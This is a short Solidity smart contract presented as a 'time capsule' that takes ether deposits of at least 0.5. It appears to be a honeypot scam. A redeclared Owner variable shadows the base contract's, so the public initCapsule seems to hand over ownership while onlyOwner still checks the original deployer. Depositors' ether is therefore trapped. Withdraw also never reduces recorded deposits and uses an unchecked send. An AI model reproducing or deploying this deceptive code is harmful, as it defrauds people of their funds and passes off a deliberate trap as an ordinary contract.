1 pragma solidity ^0.4.16;
2 
3 contract Ownable {
4     address public Owner;
5     
6     function Ownable() { Owner = msg.sender; }
7 
8     modifier onlyOwner() {
9         if( Owner == msg.sender ) {
10             _;
11         }
12     }
13     
14     function transferOwner(address _owner) onlyOwner {
15         if( this.balance == 0 ) {
16             Owner = _owner;
17         }
18     }
19 }
20 
21 contract TimeCapsuleEvent is Ownable {
22     address public Owner;
23     mapping (address=>uint) public deposits;
24     uint public openDate;
25     
26     event Initialized(address indexed owner, uint openOn);
27     function initCapsule(uint open) {
28         Owner = msg.sender;
29         openDate = open;
30         Initialized(Owner, openDate);
31     }
32 
33     function() payable { deposit(); }
34 
35     event Deposit(address indexed depositor, uint amount);
36     function deposit() payable {
37         if( msg.value >= 0.5 ether ) {
38             deposits[msg.sender] += msg.value;
39             Deposit(msg.sender, msg.value);
40         } else throw;
41     }
42 
43     event Withdrawal(address indexed withdrawer, uint amount);
44     function withdraw(uint amount) payable onlyOwner {
45         if( now >= openDate ) {
46             uint max = deposits[msg.sender];
47             if( amount <= max && max > 0 ) {
48                 msg.sender.send( amount );
49                 Withdrawal(msg.sender, amount);
50             }
51         }
52     }
53 
54     function kill() onlyOwner {
55         if( this.balance == 0 )
56             suicide( msg.sender );
57 	}
58 }